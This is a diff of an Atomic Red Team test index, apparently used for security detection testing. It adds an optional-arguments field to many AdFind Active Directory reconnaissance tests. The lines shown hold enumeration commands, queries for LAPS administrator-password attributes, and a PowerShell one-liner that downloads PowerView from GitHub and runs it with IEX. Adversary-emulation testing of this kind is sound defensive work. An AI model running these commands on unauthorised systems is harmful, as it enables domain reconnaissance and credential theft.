@@ -876,7 +876,7 @@ input_arguments.port_file.default: PathToAtomicsFolder\T1016\src\top-128.txt
 "
 T1016,System Network Configuration Discovery,Adfind - Enumerate Active Directory Subnet Objects,9bb45dd7-c466-4f93-83a1-be30e56033ee,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects
 reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
-",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=subnet)
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=subnet) #{optional_args}
 ",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}
@@ -884,7 +884,13 @@ dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPa
 dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
 Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
 
-",
+","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+"
 T1016,System Network Configuration Discovery,Qakbot Recon,121de5c6-5818-4868-b8a7-8fd07c455c1b,A list of commands known to be performed by Qakbot for recon purposes,windows,,,"""#{recon_commands}""
 ",command_prompt,,,,powershell,"dependencies.0.description: File to copy must exist on disk at specified location (#{recon_commands})
 
@@ -4650,7 +4656,7 @@ dependencies.1.get_prereq_command: Write-Host ""Sorry RSAT must be installed man
 ",
 T1482,Domain Trust Discovery,Adfind - Enumerate Active Directory OUs,d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs
 reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
-",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=organizationalUnit)
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=organizationalUnit) #{optional_args}
 ",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}
@@ -4658,10 +4664,16 @@ dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPa
 dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
 Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
 
-",
+","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+"
 T1482,Domain Trust Discovery,Adfind - Enumerate Active Directory Trusts,15fe436d-e771-4ff3-b655-2dca9ba52834,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts
 reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
-",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -gcb -sc trustdmp
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -gcb -sc trustdmp
 ",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}
@@ -4669,7 +4681,13 @@ dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPa
 dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
 Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
 
-",
+","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+"
 T1482,Domain Trust Discovery,Get-DomainTrust with PowerView,f974894c-5991-4b19-aaf5-7cc2fe298c5d,"Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.
 ",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose
@@ -13243,7 +13261,7 @@ input_arguments.adrecon_path.default: PathToAtomicsFolder\..\ExternalPayloads\AD
 "
 T1087.002,Account Discovery: Domain Account,Adfind -Listing password policy,736b4f53-f400-4c22-855d-1a6b5a551600,"Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.
 reference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx
-",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties
 ",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}
@@ -13251,10 +13269,16 @@ dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPa
 dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
 Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
 
-",
+","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+"
 T1087.002,Account Discovery: Domain Account,Adfind - Enumerate Active Directory Admins,b95fd967-4e62-4109-b48d-265edfd28c3a,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts
 reference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/
-",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc admincountdmp #{optional_args}
 ",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}
@@ -13262,10 +13286,16 @@ dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPa
 dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
 Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
 
-",
+","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+"
 T1087.002,Account Discovery: Domain Account,Adfind - Enumerate Active Directory User Objects,e1ec8d20-509a-4b9a-b820-06c9b2da8eb7,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects
 reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
-",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person)
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=person) #{optional_args}
 ",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}
@@ -13273,10 +13303,16 @@ dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPa
 dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
 Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
 
-",
+","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+"
 T1087.002,Account Discovery: Domain Account,Adfind - Enumerate Active Directory Exchange AD Objects,5e2938fb-f919-47b6-8b29-2f6a1f718e99,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects
 reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
-",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc exchaddresses #{optional_args}
 ",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}
@@ -13284,7 +13320,13 @@ dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPa
 dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
 Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
 
-",
+","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+"
 T1087.002,Account Discovery: Domain Account,Enumerate Default Domain Admin Details (Domain),c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef,"This test will enumerate the details of the built-in domain admin account
 ",windows,,,"net user administrator /domain
 ",command_prompt,,,,,,
@@ -13394,16 +13436,28 @@ input_arguments.hostname.default: $env:computername
 
 "
 T1087.002,Account Discovery: Domain Account,Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,ffbcfd62-15d6-4989-a21a-80bfc8e58bb5,This test executes LDAP query using powershell command Get-ADComputer with SearchScope as subtree and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime,windows,,,"Get-adcomputer -SearchScope subtree -filter ""name -like '*'"" -Properties *",powershell,False,,,,,
-T1087.002,Account Discovery: Domain Account,Suspicious LAPS Attributes Query with adfind all properties,abf00f6c-9983-4d9a-afbc-6b1c6c6448e1,This test executes LDAP query using adfind command and lists all the attributes including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime,windows,,,"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -h #{domain} -s subtree -f ""objectclass=computer"" *
-",powershell,False,,,,,"input_arguments.domain.description: Domain of the host
+T1087.002,Account Discovery: Domain Account,Suspicious LAPS Attributes Query with adfind all properties,abf00f6c-9983-4d9a-afbc-6b1c6c6448e1,This test executes LDAP query using adfind command and lists all the attributes including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime,windows,,,"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" *
+",powershell,False,,,,,"input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+input_arguments.domain.description: Domain of the host
 
 input_arguments.domain.type: string
 
 input_arguments.domain.default: $env:USERDOMAIN
 
 "
-T1087.002,Account Discovery: Domain Account,Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,51a98f96-0269-4e09-a10f-e307779a8b05,This test executes LDAP query using adfind command and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime,windows,,,"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -h #{domain} -s subtree -f ""objectclass=computer"" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
-",powershell,False,,,,,"input_arguments.domain.description: Domain of the host
+T1087.002,Account Discovery: Domain Account,Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,51a98f96-0269-4e09-a10f-e307779a8b05,This test executes LDAP query using adfind command and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime,windows,,,"& ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+",powershell,False,,,,,"input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+input_arguments.domain.description: Domain of the host
 
 input_arguments.domain.type: string
 
@@ -13847,7 +13901,7 @@ dependencies.1.get_prereq_command: Add-WindowsCapability -Online -Name ""Rsat.Ac
 ",
 T1069.002,Permission Groups Discovery: Domain Groups,Adfind - Query Active Directory Groups,48ddc687-82af-40b7-8472-ff1e742e8274,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups
 reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
-",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=group)
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=group) #{optional_args}
 ",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}
@@ -13856,7 +13910,13 @@ dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol =
 New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
 Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
 
-",
+","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+"
 T1069.002,Permission Groups Discovery: Domain Groups,Enumerate Active Directory Groups with Get-AdGroup,3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8,"The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.
 Upon successful execution a listing of groups will output with their paths in AD.
 Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps
@@ -14921,7 +14981,7 @@ input_arguments.host_name.default: 192.168.1.1
 "
 T1018,Remote System Discovery,Adfind - Enumerate Active Directory Computer Objects,a889f5be-2d54-4050-bd05-884578748bb4,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects
 reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
-",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer)
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) #{optional_args}
 ",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}
@@ -14929,10 +14989,16 @@ dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPa
 dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
 Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
 
-",
+","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+"
 T1018,Remote System Discovery,Adfind - Enumerate Active Directory Domain Controller Objects,5838c31e-a0e2-4b9f-b60a-d79d2cb7995e,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects
 reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
-",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -sc dclist
+",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -sc dclist
 ",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)
 
 dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}
@@ -14940,7 +15006,13 @@ dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPa
 dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
 Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""
 
-",
+","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.
+
+input_arguments.optional_args.type: string
+
+input_arguments.optional_args.default: None
+
+"
 T1018,Remote System Discovery,Remote System Discovery - ip neighbour,158bd4dd-6359-40ab-b13c-285b9ef6fa25,"Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. 
 ",linux,,,"ip neighbour show
 ",sh,,,,sh,"dependencies.0.description: Check if ip command exists on the machine
@@ -19714,7 +19786,7 @@ Executes the code specified within the .dotm template.
 Requires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  
 Default docs file opens Calculator.exe when test sucessfully executed, while AV turned off.
 ",windows,,,"start ""#{docx_file}""
-",command_prompt,,,,powershell,,"input_arguments.docx_file.description: Location of the test docx file on the local filesystem.
+",command_prompt,,,,,,"input_arguments.docx_file.description: Location of the test docx file on the local filesystem.
 
 input_arguments.docx_file.type: path
 
